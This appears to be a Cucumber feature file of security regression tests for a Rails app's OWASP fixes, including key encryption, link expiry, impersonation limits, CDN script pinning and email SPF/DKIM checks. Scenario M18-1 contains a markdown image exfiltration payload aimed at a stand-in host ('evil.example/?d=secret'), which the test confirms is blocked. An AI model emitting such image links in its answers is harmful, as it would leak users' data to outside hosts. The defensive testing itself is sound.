Feature: OWASP review 2026-11 Group A - the code-only Medium fixes, without changing working behaviour
  Each Medium fix's attack is refused, and the normal case next to it keeps working.
  Explained in docs/security/owasp_2026_11_changes.md › "Group A — twelve code-only Medium fixes".

  # M3-1 — Error case gone: a firm's vendor key is not stored readable; the model still reads it as before
  @security
  Scenario: M3-1 Vendor keys are encrypted at rest and read back unchanged
    Given there is a user "first_name=Ola" for an entity "name=Key Firm;entity_type=Investment Fund"
    When the entity's Anthropic key is set to "sk-ant-test-1234567890"
    Then the stored Anthropic key column does not contain "sk-ant-test-1234567890"
    And the entity setting's Anthropic key reads "sk-ant-test-1234567890"

  # M3-2 — Edge case: a blank key is stored as no key, so "key present" checks don't count it
  @security
  Scenario: M3-2 A blank vendor key is stored as nothing
    Given there is a user "first_name=Ola" for an entity "name=Key Firm;entity_type=Investment Fund"
    When the entity's Anthropic key is set to ""
    Then the stored Anthropic key column is empty

  # M5-1 — Error case gone / happy path: a database dump's email link lasts 1 hour; other downloads keep 7 days
  @security
  Scenario: M5-1 Database dump links expire after 1 hour
    Given there is a user "first_name=Ola" for an entity "name=Dump Firm;entity_type=Investment Fund"
    Then the emailed download link for a document tagged "DB Dump" lasts "1 hour"
    And the emailed download link for a document tagged "Download" lasts "7 days"

  # M6-1 — Error case: no API token while CapHive support is signed in as the user; the user's own session can
  @security
  Scenario: M6-1 API tokens can't be minted while impersonating
    Given there is a user "first_name=Ola" for an entity "name=Token Firm;entity_type=Investment Fund"
    Then the user may create an API token in their own session
    And the user may not create an API token while support is signed in as them

  # M7-1 — Error case: opening the Outlook add-in sign-in page issues no token; confirming does
  @security
  Scenario: M7-1 The Outlook add-in sign-in asks before handing over a token
    Given there is a user "first_name=Ola" for an entity "name=Mail Firm;entity_type=Investment Fund"
    When I open the Outlook add-in sign-in page
    Then the Outlook add-in page asks to connect and holds no token
    When I confirm the Outlook add-in connection
    Then the Outlook add-in page hands over a token

  # M9-1 — Drift guard: every script loaded from another site carries an integrity hash (two named exceptions)
  @security
  Scenario: M9-1 CDN scripts are pinned and fingerprinted
    Then every CDN script tag in the app's views has an integrity hash, except:
      | url                                                  | why                                              |
      | https://appsforoffice.microsoft.com/lib/1/hosted/office.js | Microsoft updates it in place; they say not to pin it |
      | https://cdn.tailwindcss.com/3.4.17                   | the host sends no CORS header, so SRI would block it |
    And no CDN script URL uses "@latest" or an unversioned major

  # M10-1 — Drift guard: the JavaScript libraries with advisories stay on the fixed versions
  @security
  Scenario: M10-1 DOMPurify and Mermaid stay on fixed versions
    Then the import map pins "dompurify" at version "3.4.17" or later
    And the import map loads Mermaid "11.16.1" or later

  # M12-1 — Happy path: a failed sign-in is counted; unknown event names are ignored
  @security
  Scenario: M12-1 Failed sign-ins are counted for alerting
    Given there is a user "first_name=Ola" for an entity "name=Alarm Firm;entity_type=Investment Fund"
    Then a failed sign-in with a wrong password is counted as "sign_in_failed"
    And an unknown security event name is ignored

  # M15-1 — Error case: the dashboard owner can't be another firm's fund, or a type dashboards don't use
  @security
  Scenario: M15-1 Dashboard owners come only from the user's own records
    Given there is a user "first_name=Ola" for an entity "name=Dash Firm;entity_type=Investment Fund"
    And the user has role "company_admin"
    And there is a fund "name=Own Fund" for the entity
    And another firm has a fund "Other Fund"
    Then the dashboard owner for the user's own fund is that fund
    And the dashboard owner for the other firm's fund is refused
    And the dashboard owner of type "User" is refused

  # M18-1 — Error case: an AI answer can't show an image from another site; our own and data: images stay
  @security
  Scenario: M18-1 AI answers keep only our own images
    Then rendering the AI markdown "![x](https://evil.example/?d=secret)" shows no image
    And rendering the AI markdown "![x](/rails/active_storage/blobs/x.png)" shows the image
    And rendering the AI markdown "![x](data:image/png;base64,AAAA)" shows the image

  # M19-1 — Error case and happy paths: a deal-ingest email needs a positive SPF or DKIM pass
  @security
  Scenario: M19-1 Deal-ingest emails need SPF or DKIM to pass
    Then a deal-ingest email with these authentication details is judged:
      | headers                                                      | sendgrid_spf | sendgrid_dkim       | accepted |
      | Received-SPF: softfail (domain of transitioning x)          |              |                     | no       |
      | Authentication-Results: mx; spf=neutral; dkim=none          |              |                     | no       |
      | Received-SPF: fail                                           |              |                     | no       |
      | Authentication-Results: mx; dkim=pass header.d=fund.com     |              |                     | yes      |
      | Received-SPF: pass (sendgrid.net: domain of x designates)    |              |                     | yes      |
      | SPF: pass, DKIM: pass                                        |              |                     | yes      |
      | X-Mailer: test                                               | pass         |                     | yes      |
      | X-Mailer: test                                               |              | {@fund.com : pass}  | yes      |
